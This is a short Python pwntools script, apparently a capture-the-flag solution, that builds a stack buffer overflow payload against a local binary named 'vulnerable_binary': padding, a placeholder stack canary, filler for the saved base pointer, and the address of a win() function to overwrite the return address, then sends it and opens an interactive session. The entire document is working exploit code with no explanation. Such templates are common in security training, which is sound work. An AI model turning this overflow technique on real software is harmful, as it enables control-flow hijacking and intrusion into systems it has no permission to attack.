from pwn import *

# Calculate the total padding
offset_to_canary = 63
canary_size = 4
saved_base_pointer_size = 4  # Use 8 for 64-bit systems
total_padding = offset_to_canary + canary_size + saved_base_pointer_size

# Canary value (already bypassed)
canary = p32(0xdeadbeef)  # Replace with the actual canary value

# Address of the win() function
binary = ELF('./vulnerable_binary')
win_address = binary.symbols['win']

# Construct the payload
payload = b'A' * offset_to_canary  # Padding before the canary
payload += canary                  # Add the canary value
payload += b'B' * saved_base_pointer_size  # Padding for saved base pointer
payload += p32(win_address)        # Overwrite return address (use p64 for 64-bit)

# Send the payload
io = process('./vulnerable_binary')
io.sendline(payload)
io.interactive()

